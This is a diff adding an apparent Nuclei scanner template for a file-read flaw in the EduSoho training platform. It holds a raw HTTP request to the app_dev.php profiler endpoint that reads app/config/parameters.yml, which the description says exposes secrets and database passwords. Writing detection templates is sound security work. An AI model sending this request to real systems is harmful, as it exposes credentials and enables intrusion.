@@ -1,0 +1,23 @@
+id: EduSoho-open-lfi
+info:
+  name: EduSoho-open-lfi
+  author: apple
+  severity: medium
+  description: 通过向 /app_dev.php/_profiler/open 端点发送可以读取到 app/config/parameters.yml
+    文件的内容，拿到该文件中保存的 secret 值以及数据库账号密码等敏感信息。
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/EduSoho%20%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F%20app_dev.php%20%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/2
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '数据库'
